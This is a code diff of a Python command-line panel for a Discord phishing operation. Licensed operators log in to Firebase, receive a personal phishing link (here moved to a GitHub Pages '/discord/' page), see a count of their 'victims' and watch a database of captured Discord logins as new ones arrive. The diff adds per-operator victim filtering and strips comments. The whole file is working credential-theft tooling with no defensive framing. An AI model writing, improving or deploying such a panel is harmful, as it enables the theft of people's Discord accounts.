@@ -145,10 +145,10 @@ def handle_auth(db, auth):
                 
                 user = auth.sign_in_with_email_and_password(email, password)
                 
-                # Check if user data exists
+                
                 user_data = db.child("users").child(user['localId']).get().val()
                 if not user_data:
-                    # Create user data if it doesn't exist
+                    
                     db.child("users").child(user['localId']).set({
                         "email": email,
                         "created_at": datetime.now().isoformat(),
@@ -158,7 +158,7 @@ def handle_auth(db, auth):
                 
                 print(f"{Fore.GREEN}[+] Successfully logged in!{Style.RESET_ALL}")
                 print(f"\n{Fore.CYAN}Your phishing link:{Style.RESET_ALL}")
-                print(f"{Fore.WHITE}https://xcago-login.web.app/?uid={user['localId']}{Style.RESET_ALL}\n")
+                print(f"{Fore.WHITE}https://deadcode112.github.io/discord/?uid={user['localId']}{Style.RESET_ALL}\n")
                 input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                 return user
                 
@@ -168,7 +168,7 @@ def handle_auth(db, auth):
                 
                 user = auth.create_user_with_email_and_password(email, password)
                 
-                # Create user data in database
+                
                 db.child("users").child(user['localId']).set({
                     "email": email,
                     "created_at": datetime.now().isoformat(),
@@ -178,7 +178,7 @@ def handle_auth(db, auth):
                 
                 print(f"{Fore.GREEN}[+] Successfully registered!{Style.RESET_ALL}")
                 print(f"\n{Fore.CYAN}Your phishing link:{Style.RESET_ALL}")
-                print(f"{Fore.WHITE}https://xcago-login.web.app/?uid={user['localId']}{Style.RESET_ALL}\n")
+                print(f"{Fore.WHITE}https://deadcode112.github.io/discord/?uid={user['localId']}{Style.RESET_ALL}\n")
                 input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                 return user
                 
@@ -191,14 +191,19 @@ def handle_auth(db, auth):
             time.sleep(2)
 
 def print_user_stats(db, user_id):
-    # Get total victims count from discord_logins
+    # Get all victims and filter client-side
     victims_ref = db.child("discord_logins").get()
-    total_victims = len(victims_ref.val()) if victims_ref.val() else 0
+    if victims_ref.val():
+        # Filter victims that belong to this user
+        user_victims = {k: v for k, v in victims_ref.val().items() if v.get('uid') == user_id}
+        total_victims = len(user_victims)
+    else:
+        total_victims = 0
     
     print(f"{Fore.RED}╔═════════════════════════ USER STATS ═════════════════════════╗{Style.RESET_ALL}")
     print(f"{Fore.RED}║  Total Victims: {Fore.WHITE}{total_victims}{' ' * (42 - len(str(total_victims)))}{Fore.RED}║{Style.RESET_ALL}")
     print(f"{Fore.RED}║  Your Phishing Link:{' ' * 46}║{Style.RESET_ALL}")
-    print(f"{Fore.RED}║  {Fore.WHITE}https://xcago-login.web.app/?uid={user_id}{' ' * (20 - len(user_id))}{Fore.RED}║{Style.RESET_ALL}")
+    print(f"{Fore.RED}║  {Fore.WHITE}https://deadcode112.github.io/discord/?uid={user_id}{' ' * (20 - len(user_id))}{Fore.RED}║{Style.RESET_ALL}")
     print(f"{Fore.RED}╚═════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
 
 def check_database(db, user_id):
@@ -230,11 +235,14 @@ def monitor_user_victims(db, user_id):
             current_time = datetime.now().strftime('%H:%M:%S')
             print(f"\r{Fore.BLUE}[{current_time}] Monitoring victims... {Style.RESET_ALL}", end='')
             
-            # Check all victims in discord_logins
+            # Get all victims and filter client-side
             victims_ref = db.child("discord_logins").get()
             
             if victims_ref and victims_ref.val():
-                current_data = victims_ref.val()
+                # Filter for victims captured by this user
+                current_data = {k: v for k, v in victims_ref.val().items() 
+                              if v.get('uid') == user_id}
+                
                 new_items = {k: v for k, v in current_data.items() 
                            if k not in last_data}
                 
@@ -263,10 +271,10 @@ def monitor_user_victims(db, user_id):
             break
         except Exception as e:
             print(f"\n{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
-            time.sleep(5)
+            time.sleep(2)
 
 if __name__ == "__main__":
-    # First verify license
+    
     if not verify_license():
         exit(1)
     
